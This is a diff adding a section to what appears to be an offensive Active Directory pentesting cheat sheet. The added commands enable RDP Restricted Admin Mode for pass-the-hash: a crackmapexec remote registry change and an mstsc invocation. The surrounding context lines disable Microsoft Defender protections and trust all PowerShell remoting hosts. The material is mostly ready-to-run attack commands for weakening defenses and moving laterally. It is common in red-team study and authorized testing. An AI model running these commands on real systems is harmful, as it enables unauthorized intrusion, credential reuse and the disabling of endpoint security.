@@ -728,6 +728,17 @@ Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection 
 ```
 Enable-PSRemoting -Force;Set-Item wsman:\localhost\client\trustedhosts *
 ```
+
+### Enable Restricted Admin Mode (RDP PTH)
+Crackmapexec:
+```
+crackmapexec smb <IP> -u <username> -p <password> -x 'reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD'
+```
+
+LOLBIN:
+```
+mstsc.exe /restrictedadmin
+```
 ## Privesc
 ### DNSADMINS group
 ```powershell
